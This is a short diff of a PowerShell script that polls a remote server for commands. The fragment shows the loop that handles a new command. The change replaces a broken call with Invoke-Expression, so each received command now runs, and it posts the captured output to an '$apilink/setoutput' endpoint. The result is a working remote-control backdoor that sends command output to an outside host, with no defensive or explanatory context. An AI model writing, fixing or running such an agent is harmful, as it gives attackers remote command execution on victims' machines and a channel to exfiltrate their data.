@@ -7,11 +7,11 @@ while ($true) {
     if ($new_cmd -ne $cmd) {
         $cmd = $new_cmd
 
-        $output = &cmd | Out-String
+        # Execute the command and capture the output
+        $output = Invoke-Expression $cmd | Out-String
 
-        $output = $output.Trim()
-        Invoke-RestMethod -Uri "$apilink/setoutput" -Method Post -Body @{output=$output}
-
+        # Send the output back to the server
+        Invoke-RestMethod -Uri "$apilink/setoutput" -Method Post -Body @{output=$output.Trim()} -ContentType 'application/x-www-form-urlencoded'
     } else {
         Start-Sleep -Seconds 2
     }
